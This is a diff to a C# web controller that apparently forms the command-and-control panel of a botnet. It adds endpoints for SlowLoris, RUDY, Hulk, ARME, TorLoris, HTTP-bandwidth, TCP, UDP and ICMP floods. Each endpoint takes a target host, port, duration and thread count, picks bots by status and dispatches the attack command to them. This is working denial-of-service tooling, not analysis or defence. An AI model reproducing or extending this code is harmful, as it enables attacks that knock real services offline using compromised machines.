@@ -1,18 +1,14 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
+﻿using System.Linq;
 using System.Threading.Tasks;
 using Alduin.Server.Commands;
 using Alduin.Web.Models;
 using Microsoft.AspNetCore.Authorization;
-using Microsoft.AspNetCore.Identity;
 using Microsoft.AspNetCore.Mvc;
 using Alduin.Server.Handler;
 using MediatR;
 using Alduin.Logic.Mediator.Queries;
-using Alduin.Shared.DTOs;
-using Alduin.Logic.Identity;
 using Newtonsoft.Json;
+using Alduin.Server.Commands.Floods;
 
 namespace Alduin.Web.Controllers
 {
@@ -51,6 +47,7 @@ namespace Alduin.Web.Controllers
             }
 
         }
+        //Commands///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
         [Authorize]
         [HttpGet]
         public IActionResult ExecuteFile()
@@ -161,10 +158,9 @@ namespace Alduin.Web.Controllers
         }
         [Authorize]
         [HttpGet]
-        public IActionResult Tcp()
+        public IActionResult TcpView()
         {
-            var model = new TcpModel
-            {
+            var model = new TcpModel {
                 Length = 32,
                 ThreadstoUse = 1000,
                 Time = 60
@@ -173,7 +169,7 @@ namespace Alduin.Web.Controllers
         }
         [Authorize]
         [HttpGet]
-        public IActionResult Udp()
+        public IActionResult UdpView()
         {
             var model = new UdpModel
             {
@@ -183,6 +179,7 @@ namespace Alduin.Web.Controllers
             };
             return PartialView("_Udp", model);
         }
+        //Executes/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
         [Authorize]
         [HttpPost]
         public async Task<IActionResult> ExecuteCommand(ExecuteModel model)
@@ -274,6 +271,313 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(messageCommand).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> ExecuteArme(ArmeModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "Arme"
+            };
+            var Variables = new ArmeVariables
+            {
+                Port = model.Port,
+                PostDATA = model.PostDATA,
+                RandomFile = model.RandomFile
+
+            };
+            var FloodModel = new Server.Commands.BaseFloodModel
+            {
+                Host = model.Host,
+                Time = model.Time,
+                ThreadstoUse = model.ThreadstoUse,
+            };
+            var Command = new ArmeCommand
+            {
+                newArmeVariables = Variables,
+                newBaseCommand = method,
+                newBaseFloodModel = FloodModel
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> ExecuteSlowLoris(SlowLorisModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "SlowLoris"
+            };
+            var Variables = new SlowLorisVariables
+            {
+                Port = model.Port,
+                PostDATA = model.PostDATA,
+                RandomFile = model.RandomFile
+
+            };
+            var FloodModel = new Server.Commands.BaseFloodModel
+            {
+                Host = model.Host,
+                Time = model.Time,
+                ThreadstoUse = model.ThreadstoUse,
+            };
+            var Command = new SlowLorisCommand
+            {
+                newSlowLorisVariables = Variables,
+                newBaseCommand = method,
+                newBaseFloodModel = FloodModel
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> ExecuteHttpBandWidth(HttpBandWidthModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "HttpBandWidth"
+            };
+            var Variables = new HttpBandWidthVariables
+            {
+                Port = model.Port,
+                PostDATA = model.PostDATA,
+                RandomFile = model.RandomFile
+
+            };
+            var FloodModel = new Server.Commands.BaseFloodModel
+            {
+                Host = model.Host,
+                Time = model.Time,
+                ThreadstoUse = model.ThreadstoUse,
+            };
+            var Command = new HttpBandWidthCommand
+            {
+                newHttpBandWidthVariables = Variables,
+                newBaseCommand = method,
+                newBaseFloodModel = FloodModel
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> ExecuteHulk(HulkModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "Hulk"
+            };
+            var Variables = new HulkVariables
+            {
+                Port = model.Port,
+                PostDATA = model.PostDATA,
+                RandomFile = model.RandomFile
+
+            };
+            var FloodModel = new Server.Commands.BaseFloodModel
+            {
+                Host = model.Host,
+                Time = model.Time,
+                ThreadstoUse = model.ThreadstoUse,
+            };
+            var Command = new HulkCommand
+            {
+                newHulkVariables = Variables,
+                newBaseCommand = method,
+                newBaseFloodModel = FloodModel
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> ExecuteTorLoris(TorLorisModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "TorLoris"
+            };
+            var Variables = new TorLorisVariables
+            {
+                Port = model.Port,
+                PostDATA = model.PostDATA,
+                RandomFile = model.RandomFile
+
+            };
+            var FloodModel = new Server.Commands.BaseFloodModel
+            {
+                Host = model.Host,
+                Time = model.Time,
+                ThreadstoUse = model.ThreadstoUse,
+            };
+            var Command = new TorLorisCommand
+            {
+                newTorLorisVariables = Variables,
+                newBaseCommand = method,
+                newBaseFloodModel = FloodModel
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> ExecuteRudy(RudyModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "Rudy"
+            };
+            var Variables = new RudyVariables
+            {
+                Port = model.Port,
+                PostDATA = model.PostDATA,
+            };
+            var FloodModel = new Server.Commands.BaseFloodModel
+            {
+                Host = model.Host,
+                Time = model.Time,
+                ThreadstoUse = model.ThreadstoUse,
+            };
+            var Command = new RudyCommand
+            {
+                newRudyVariables = Variables,
+                newBaseCommand = method,
+                newBaseFloodModel = FloodModel
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> ExecuteTcp(TcpModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "Tcp"
+            };
+            var Variables = new TcpVariables
+            {
+                Port = model.Port,
+                Length = model.Length 
+            };
+            var FloodModel = new Server.Commands.BaseFloodModel
+            {
+                Host = model.Host,
+                Time = model.Time,
+                ThreadstoUse = model.ThreadstoUse,
+            };
+            var Command = new TcpCommand
+            {
+                newTcpVariables = Variables,
+                newBaseCommand = method,
+                newBaseFloodModel = FloodModel
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> ExecuteUdp(UdpModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "Udp"
+            };
+            var Variables = new UdpVariables
+            {
+                Port = model.Port,
+                Length = model.Length
+            };
+            var FloodModel = new Server.Commands.BaseFloodModel
+            {
+                Host = model.Host,
+                Time = model.Time,
+                ThreadstoUse = model.ThreadstoUse,
+            };
+            var Command = new UdpCommand
+            {
+                newUdpVariables = Variables,
+                newBaseCommand = method,
+                newBaseFloodModel = FloodModel
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> ExecuteIcmp(IcmpModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "Icmp"
+            };
+            var Variables = new IcmpVariables
+            {
+                Timeout = model.Timeout,
+                Length = model.Length
+            };
+            var FloodModel = new Server.Commands.BaseFloodModel
+            {
+                Host = model.Host,
+                Time = model.Time,
+                ThreadstoUse = model.ThreadstoUse,
+            };
+            var Command = new IcmpCommand
+            {
+                newIcmpVariables = Variables,
+                newBaseCommand = method,
+                newBaseFloodModel = FloodModel
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
             return Json(response);
         }
     }
